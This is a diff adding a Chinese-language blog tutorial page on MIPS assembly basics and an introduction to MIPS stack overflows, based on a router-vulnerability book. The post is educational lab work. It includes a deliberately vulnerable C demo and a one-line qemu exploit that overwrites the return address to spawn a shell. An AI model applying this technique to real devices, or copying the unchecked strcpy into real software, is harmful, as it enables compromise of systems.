@@ -1,0 +1,979 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="依照《揭秘家用路由器0day漏洞挖掘技术》一书，回顾了MIPS基础，简单了解了MIPS栈溢出。">
+<meta name="keywords" content="MIPS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MIPS基础及栈溢出入门（一）">
+<meta property="og:url" content="http://yoursite.com/2020/07/16/MIPS基础及栈溢出入门（一）/index.html">
+<meta property="og:site_name" content="cd &#x2F;pwn">
+<meta property="og:description" content="依照《揭秘家用路由器0day漏洞挖掘技术》一书，回顾了MIPS基础，简单了解了MIPS栈溢出。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-07-17T04:14:40.018Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MIPS基础及栈溢出入门（一）">
+<meta name="twitter:description" content="依照《揭秘家用路由器0day漏洞挖掘技术》一书，回顾了MIPS基础，简单了解了MIPS栈溢出。">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2020/07/16/MIPS基础及栈溢出入门（一）/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>MIPS基础及栈溢出入门（一） | cd /pwn</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cd /pwn</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/16/MIPS基础及栈溢出入门（一）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Eros John">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cd /pwn">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">MIPS基础及栈溢出入门（一）
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-07-16 14:38:50" itemprop="dateCreated datePublished" datetime="2020-07-16T14:38:50+08:00">2020-07-16</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-07-17 12:14:40" itemprop="dateModified" datetime="2020-07-17T12:14:40+08:00">2020-07-17</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Stack-Overflow/" itemprop="url" rel="index"><span itemprop="name">Stack Overflow</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>依照《揭秘家用路由器0day漏洞挖掘技术》一书，回顾了MIPS基础，简单了解了MIPS栈溢出。<br><a id="more"></a></p>
+<h1 id="MIPS汇编基础"><a href="#MIPS汇编基础" class="headerlink" title="MIPS汇编基础"></a>MIPS汇编基础</h1><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><h3 id="MIPS指令集的指令特点"><a href="#MIPS指令集的指令特点" class="headerlink" title="MIPS指令集的指令特点"></a>MIPS指令集的指令特点</h3><ul>
+<li>指令长度为固定4字节。</li>
+<li>内存中的数据访问（load/store）严格对齐。</li>
+<li>流水线效应。MIPS采用了高度的流水线，其中一个重要的效应时分支延迟效应。</li>
+</ul>
+<h3 id="与x86指令集的差异"><a href="#与x86指令集的差异" class="headerlink" title="与x86指令集的差异"></a>与x86指令集的差异</h3><ol>
+<li>栈操作：MIPS32架构堆栈与x86架构一样，都是向低地址增长的。但在MIP32架构中没有EBP（栈底指针），进入一个函数时，需要将当前栈指针向下移动n比特，这个大小为n比特的存储空间就是此函数的Stack Frame的存储区域。此后，栈指针便不再移动，只能在函数返回时将栈指针加上这个偏移量恢复栈现场。由于不能随便移动栈指针，所以寄存器压栈和出栈时都必须指定偏移量。没有堆栈直接操作的指令，也就是没有push和pop指令。</li>
+<li>调用：如果函数A调用函数B，调用者函数（函数A）会在自己的栈顶预留一部分空间来保存被调用者（函数B）的参数，我们称之为调用参数空间。</li>
+<li>参数传递方式：前4个传入的参数通过$a0~$a3传递。有些函数的参数可能会超过4个，此时，多余的参数会被放入调用参数空间。x86架构32位下所有的参数都是通过堆栈传递的。</li>
+<li>返回地址：在x86架构中，使用call命令调用函数时，会先将当前执行位置压入堆栈，MIPS的调用指令把函数的返回地址直接存入$RA寄存器而不是堆栈中。</li>
+</ol>
+<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><table>
+<thead>
+<tr>
+<th style="text-align:left">编号</th>
+<th style="text-align:left">寄存器名称</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">$0</td>
+<td style="text-align:left">$zero</td>
+<td style="text-align:left">第0号寄存器，其值始终为0</td>
+</tr>
+<tr>
+<td style="text-align:left">$1</td>
+<td style="text-align:left">$at</td>
+<td style="text-align:left">保留寄存器</td>
+</tr>
+<tr>
+<td style="text-align:left">$2-$3</td>
+<td style="text-align:left">$v0-$v1</td>
+<td style="text-align:left">values，保存表达式或函数返回结果</td>
+</tr>
+<tr>
+<td style="text-align:left">$4-$7</td>
+<td style="text-align:left">$a0-$a3</td>
+<td style="text-align:left">argument，作为函数的前四个参数</td>
+</tr>
+<tr>
+<td style="text-align:left">$8-$15</td>
+<td style="text-align:left">$t0-$t7</td>
+<td style="text-align:left">temporaries，供汇编程序使用的临时寄存器</td>
+</tr>
+<tr>
+<td style="text-align:left">$16-$23</td>
+<td style="text-align:left">$s0-$s7</td>
+<td style="text-align:left">saved values，子函数使用时需先保存原寄存器的值</td>
+</tr>
+<tr>
+<td style="text-align:left">$24-$25</td>
+<td style="text-align:left">$t8-$t9</td>
+<td style="text-align:left">temporaries，供汇编程序使用的临时寄存器，补充$t0-$t7</td>
+</tr>
+<tr>
+<td style="text-align:left">$26-$27</td>
+<td style="text-align:left">$k0-$k1</td>
+<td style="text-align:left">保留，中断处理函数使用</td>
+</tr>
+<tr>
+<td style="text-align:left">$28</td>
+<td style="text-align:left">$gp</td>
+<td style="text-align:left">global pointer，全局指针</td>
+</tr>
+<tr>
+<td style="text-align:left">$29</td>
+<td style="text-align:left">$sp</td>
+<td style="text-align:left">stack pointer，堆栈指针，指向堆栈的栈顶</td>
+</tr>
+<tr>
+<td style="text-align:left">$30</td>
+<td style="text-align:left">$fp</td>
+<td style="text-align:left">frame pointer，保存栈指针</td>
+</tr>
+<tr>
+<td style="text-align:left">$31</td>
+<td style="text-align:left">$ra</td>
+<td style="text-align:left">return address，返回地址</td>
+</tr>
+</tbody>
+</table>
+<h2 id="叶子函数与非叶子函数"><a href="#叶子函数与非叶子函数" class="headerlink" title="叶子函数与非叶子函数"></a>叶子函数与非叶子函数</h2><ul>
+<li>叶子函数：当前函数不调用其他函数。</li>
+<li>非叶子函数：当前函数调用其他函数。<br>其中，函数调用的过程为：</li>
+</ul>
+<ol>
+<li>当A函数调用B函数时，函数调用指令复制当前的$PC寄存器的值到$RA寄存器，即当前$RA寄存器的值就是当前函数执行结束的返回地址，然后跳转B并执行。</li>
+<li>程序跳转到函数B以后，如果函数B时非叶子节点，则函数B首先会把函数A的返回地址（此时返回函数A的地址存放在$RA寄存器中）存入堆栈，否则返回函数A的地址仍然存放在$RA中。</li>
+<li>函数返回时，如果函数B是叶子函数，则直接使用“jr $ra”指令返回函数A，这里的寄存器$RA指向返回地址。如果函数B是非叶子函数，返回过程相对来说复杂一点，函数B先从堆栈中取出被保存在堆栈上的返回地址，然后将返回地址存入寄存器$RA，再使用“jr $ra”指令返回函数A。</li>
+</ol>
+<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><pre><code>cat demo.c
+</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">has_stack</span><span class="params">(<span class="keyword">char</span> *src)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> dst[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">strcpy</span>(dst,src);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"copy success\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">        has_stack(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>进行编译</p>
+<pre><code>mipsel-linux-gcc -static demo.c -o demo
+</code></pre><p>在IDA中查看相关函数信息<br><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00400470</span>  <span class="comment"># int __cdecl main(int argc, const char **argv, const char **envp)</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400470</span>                 .globl main</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400470</span> main:                                    <span class="comment"># DATA XREF: _ftext+18↑o</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400470</span>                                          <span class="comment"># .got:main_ptr↓o</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400470</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400470</span> var_8           = -<span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400470</span> var_4           = -<span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400470</span> arg_0           =  <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400470</span> arg_4           =  <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400470</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400470</span>                 <span class="keyword">addiu </span>  $<span class="built_in">sp</span>, -<span class="number">0x20</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400474</span>                 <span class="keyword">sw </span>     $<span class="built_in">ra</span>, <span class="number">0x20</span>+var_4($<span class="built_in">sp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400478</span>                 <span class="keyword">sw </span>     $<span class="built_in">fp</span>, <span class="number">0x20</span>+var_8($<span class="built_in">sp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040047</span>C                 <span class="keyword">move </span>   $<span class="built_in">fp</span>, $<span class="built_in">sp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400480</span>                 <span class="keyword">sw </span>     $<span class="built_in">a0</span>, <span class="number">0x20</span>+arg_0($<span class="built_in">fp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400484</span>                 <span class="keyword">sw </span>     $<span class="built_in">a1</span>, <span class="number">0x20</span>+arg_4($<span class="built_in">fp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400488</span>                 <span class="keyword">lw </span>     $<span class="built_in">v0</span>, <span class="number">0x20</span>+arg_4($<span class="built_in">fp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040048</span>C                 <span class="keyword">addiu </span>  $<span class="built_in">v0</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400490</span>                 <span class="keyword">lw </span>     $<span class="built_in">v0</span>, <span class="number">0</span>($<span class="built_in">v0</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400494</span>                 <span class="keyword">move </span>   $<span class="built_in">a0</span>, $<span class="built_in">v0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400498</span>                 <span class="keyword">jal </span>    has_stack</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040049</span>C                 <span class="keyword">nop</span></span><br><span class="line"><span class="keyword">.text:004004A0 </span>                <span class="keyword">nop</span></span><br><span class="line"><span class="keyword">.text:004004A4 </span>                <span class="keyword">move </span>   $<span class="built_in">sp</span>, $<span class="built_in">fp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004004</span>A8                 <span class="keyword">lw </span>     $<span class="built_in">ra</span>, <span class="number">0x20</span>+var_4($<span class="built_in">sp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004004</span>AC                 <span class="keyword">lw </span>     $<span class="built_in">fp</span>, <span class="number">0x20</span>+var_8($<span class="built_in">sp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004004</span>B0                 <span class="keyword">addiu </span>  $<span class="built_in">sp</span>, <span class="number">0x20</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004004</span>B4                 <span class="keyword">jr </span>     $<span class="built_in">ra</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004004</span>B8                 <span class="keyword">nop</span></span><br><span class="line"><span class="keyword">.text:004004B8 </span> <span class="comment"># End of function main</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E4                 .globl has_stack</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E4 has_stack:                               <span class="comment"># CODE XREF: main+28↓p</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E4</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E4 var_28          = -<span class="number">0x28</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E4 <span class="keyword">buf </span>            = -<span class="number">0x20</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E4 var_1C          = -<span class="number">0x1C</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E4 var_18          = -<span class="number">0x18</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E4 var_14          = -<span class="number">0x14</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E4 var_10          = -<span class="number">0x10</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E4 saved_fp        = -<span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E4 saved_ra        = -<span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E4 arg_0           =  <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E4</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E4                 <span class="keyword">addiu </span>  $<span class="built_in">sp</span>, -<span class="number">0x38</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>E8                 <span class="keyword">sw </span>     $<span class="built_in">ra</span>, <span class="number">0x38</span>+saved_ra($<span class="built_in">sp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>EC                 <span class="keyword">sw </span>     $<span class="built_in">fp</span>, <span class="number">0x38</span>+saved_fp($<span class="built_in">sp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>F0                 <span class="keyword">move </span>   $<span class="built_in">fp</span>, $<span class="built_in">sp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>F4                 li      $<span class="built_in">gp</span>, <span class="number">0x4271E0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">004003</span>FC                 <span class="keyword">sw </span>     $<span class="built_in">gp</span>, <span class="number">0x38</span>+var_28($<span class="built_in">sp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400400</span>                 <span class="keyword">sw </span>     $<span class="built_in">a0</span>, <span class="number">0x38</span>+arg_0($<span class="built_in">fp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400404</span>                 <span class="keyword">sw </span>     $<span class="built_in">zero</span>, <span class="number">0x38</span>+<span class="keyword">buf($fp)</span></span><br><span class="line"><span class="keyword">.text:00400408 </span>                <span class="keyword">sw </span>     $<span class="built_in">zero</span>, <span class="number">0x38</span>+var_1C($<span class="built_in">fp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040040</span>C                 <span class="keyword">sw </span>     $<span class="built_in">zero</span>, <span class="number">0x38</span>+var_18($<span class="built_in">fp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400410</span>                 <span class="keyword">sw </span>     $<span class="built_in">zero</span>, <span class="number">0x38</span>+var_14($<span class="built_in">fp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400414</span>                 <span class="keyword">sw </span>     $<span class="built_in">zero</span>, <span class="number">0x38</span>+var_10($<span class="built_in">fp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400418</span>                 <span class="keyword">lw </span>     $<span class="built_in">a1</span>, <span class="number">0x38</span>+arg_0($<span class="built_in">fp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040041</span>C                 <span class="keyword">addiu </span>  $<span class="built_in">v0</span>, $<span class="built_in">fp</span>, <span class="number">0x38</span>+<span class="keyword">buf</span></span><br><span class="line"><span class="keyword">.text:00400420 </span>                <span class="keyword">move </span>   $<span class="built_in">a0</span>, $<span class="built_in">v0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400424</span>                 la      $<span class="built_in">v0</span>, strcpy</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400428</span>                 <span class="keyword">move </span>   $<span class="built_in">t9</span>, $<span class="built_in">v0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040042</span>C                 <span class="keyword">bal </span>    strcpy</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400430</span>                 <span class="keyword">nop</span></span><br><span class="line"><span class="keyword">.text:00400434 </span>                <span class="keyword">lw </span>     $<span class="built_in">gp</span>, <span class="number">0x38</span>+var_28($<span class="built_in">fp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400438</span>                 <span class="keyword">lui </span>    $<span class="built_in">v0</span>, <span class="number">0x41</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040043</span>C                 <span class="keyword">addiu </span>  $<span class="built_in">a0</span>, $<span class="built_in">v0</span>, (aCopySuccess - <span class="number">0x410000</span>)  <span class="comment"># "copy success"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400440</span>                 la      $<span class="built_in">v0</span>, puts</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400444</span>                 <span class="keyword">move </span>   $<span class="built_in">t9</span>, $<span class="built_in">v0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400448</span>                 <span class="keyword">bal </span>    puts</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040044</span>C                 <span class="keyword">nop</span></span><br><span class="line"><span class="keyword">.text:00400450 </span>                <span class="keyword">lw </span>     $<span class="built_in">gp</span>, <span class="number">0x38</span>+var_28($<span class="built_in">fp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400454</span>                 <span class="keyword">nop</span></span><br><span class="line"><span class="keyword">.text:00400458 </span>                <span class="keyword">move </span>   $<span class="built_in">sp</span>, $<span class="built_in">fp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040045</span>C                 <span class="keyword">lw </span>     $<span class="built_in">ra</span>, <span class="number">0x38</span>+saved_ra($<span class="built_in">sp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400460</span>                 <span class="keyword">lw </span>     $<span class="built_in">fp</span>, <span class="number">0x38</span>+saved_fp($<span class="built_in">sp</span>)</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400464</span>                 <span class="keyword">addiu </span>  $<span class="built_in">sp</span>, <span class="number">0x38</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00400468</span>                 <span class="keyword">jr </span>     $<span class="built_in">ra</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040046</span>C                 <span class="keyword">nop</span></span><br><span class="line"><span class="keyword">.text:0040046C </span> <span class="comment"># End of function has_stack</span></span><br></pre></td></tr></table></figure>
+<p>在<code>has_stack</code>函数中，由于没有对参数<code>src</code>的长度进行限制，如果<code>src</code>长度足够，则能够覆盖栈上面存储的<code>$RA</code>寄存器的值，从而返回<code>vuln</code>函数以getshell。<br>通过观察栈来获取<code>buf</code>与<code>saved_ra</code>的偏移。<br><code>offset = saved_ra - buf = -4 + 0x20 = 28</code>，<code>vuln</code>的地址为<code>0x00400390</code>。<br>通过exp：</p>
+<pre><code>qemu-mipsel demo `python -c &quot;print &apos;a&apos;*28+&apos;\x90\x03\x40\x00&apos;&quot;`
+</code></pre><p>运行之后成功getshell。</p>
+<h2 id="stack-vuln"><a href="#stack-vuln" class="headerlink" title="stack_vuln"></a>stack_vuln</h2><p>《揭秘家用路由器0day漏洞挖掘技术》一书中的一个栈溢出demo。<br>源码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 